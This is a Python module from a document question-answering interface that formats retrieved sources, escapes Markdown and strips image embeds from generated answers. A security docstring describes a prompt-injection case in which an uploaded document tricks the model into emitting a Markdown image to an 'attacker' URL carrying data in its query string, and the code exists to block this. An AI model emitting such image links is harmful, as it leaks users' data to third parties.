"""Turn generator results into display-ready source data. No Streamlit."""

import re
from typing import Any, Iterable, Optional

from ui.config import MAX_EXCERPT_CHARS

_MARKDOWN_SPECIAL = re.compile(r"([\\`*_{}\[\]()#+\-.!|>~<$])")


def truncate_excerpt(text: Optional[str], limit: int = MAX_EXCERPT_CHARS) -> str:
    """Collapse whitespace and cut at a word boundary, adding an ellipsis."""
    text = " ".join((text or "").split())
    if len(text) <= limit:
        return text
    cut = text[:limit]
    if " " in cut[limit // 2:]:
        cut = cut[:cut.rfind(" ")]
    return cut.rstrip(" ,;:.") + "…"


def escape_markdown(text: str) -> str:
    """Escape Markdown so document-controlled text renders literally.

    Security: filenames and section headings come from uploaded documents and
    are shown in Markdown-rendered labels. Escaping stops them from injecting
    links, images or formatting.
    """
    return _MARKDOWN_SPECIAL.sub(r"\\\1", text)


def display_filename(value: Any) -> Optional[str]:
    """Only the last path component, so no private directory is ever shown."""
    if not value:
        return None
    return re.split(r"[\\/]", str(value))[-1] or None


def dedupe_sources(sources: Iterable[dict[str, Any]]) -> list[dict[str, Any]]:
    """Drop repeated chunks, keeping the first (best-ranked) occurrence."""
    seen: set[tuple[Any, Any, Any]] = set()
    unique = []
    for source in sources:
        key = (source.get("filename"), source.get("page"), source.get("chunk_id"))
        if key in seen:
            continue
        seen.add(key)
        unique.append(source)
    return unique


def format_source(source: dict[str, Any], cited: bool) -> dict[str, Any]:
    """Display data for one source. Missing fields are left out, never 'None'.

    Returns {"number", "cited", "label", "fields": [(name, value)], "excerpt"}.
    """
    number = source.get("number")
    filename = display_filename(source.get("filename"))
    fields: list[tuple[str, str]] = []
    if filename:
        fields.append(("Document", filename))
    if source.get("page") is not None:
        fields.append(("Page", str(source["page"])))
    if source.get("section"):
        fields.append(("Section", str(source["section"])))
    if source.get("chunk_id"):
        fields.append(("Chunk ID", str(source["chunk_id"])))
    if source.get("document_id"):
        fields.append(("Document ID", str(source["document_id"])))
    if isinstance(source.get("distance"), (int, float)):
        # ChromaDB returns a distance: lower means a closer match.
        fields.append(("Distance (lower is closer)", f"{source['distance']:.3f}"))

    label = f"[{number}] " if number is not None else ""
    label += filename or "Unknown document"
    if source.get("page") is not None:
        label += f" — page {source['page']}"

    return {
        "number": number,
        "cited": cited,
        "label": label,
        "fields": fields,
        "excerpt": truncate_excerpt(source.get("content")),
    }


def format_sources(result: dict[str, Any]) -> list[dict[str, Any]]:
    """Display data for every retrieved source, in retrieval order.

    Sources the answer cited are flagged using the generator's structured
    ``citations``, not by searching the answer text.
    """
    cited_numbers = {c.get("number") for c in result.get("citations") or []}
    return [
        format_source(source, source.get("number") in cited_numbers)
        for source in dedupe_sources(result.get("sources") or [])
    ]


def preview(text: Optional[str], limit: int) -> str:
    """A one-line preview of longer text, such as a question."""
    return truncate_excerpt(text, limit)


_MARKDOWN_IMAGE = re.compile(r"!\[([^\]]*)\]\([^)]*\)")


def safe_answer_markdown(answer: str) -> str:
    """Answer text for st.markdown, with image embeds reduced to their alt text.

    Security: answers are generated from uploaded documents. A document could
    trick the model into emitting ``![](https://attacker/?q=...)``, which the
    browser would load automatically. Streamlit already refuses raw HTML;
    this removes the automatic image fetch. Ordinary links need a click.
    """
    return _MARKDOWN_IMAGE.sub(r"\1", answer)


def format_rate(value: Optional[float]) -> str:
    """0.667 -> '66.7%'; a missing metric -> 'n/a' (never a fake 0%)."""
    return "n/a" if value is None else f"{value:.1%}"


def format_score(value: Optional[float]) -> str:
    """0.6398 -> '0.640'; a missing metric -> 'n/a'."""
    return "n/a" if value is None else f"{value:.3f}"
